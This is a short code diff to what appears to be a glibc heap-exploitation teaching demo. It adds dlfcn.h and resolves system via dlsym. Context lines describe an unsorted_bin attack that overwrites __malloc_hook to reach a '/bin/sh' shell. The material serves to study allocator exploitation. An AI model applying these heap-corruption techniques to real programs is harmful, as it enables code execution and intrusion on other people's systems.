@@ -1,9 +1,10 @@
+#define _GNU_SOURCE     /* for RTLD_NEXT */
 #include <stdlib.h>
 #include <stdio.h>
 #include <stdint.h>
 #include <string.h>
 #include <malloc.h>
-
+#include <dlfcn.h>
 
 char* shell = "/bin/sh\x00";
 
@@ -353,7 +354,7 @@ relative overwrite later.\n");
 	puts("Trigger the unsorted_bin attack\n");
 	malloc(0x80); // Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68
 
-	long long system_addr = (long long)system;
+	long long system_addr = (long long)dlsym(RTLD_NEXT, "system");
 
 	puts("Passed step 2 =)\n\n\n");
 	/* 
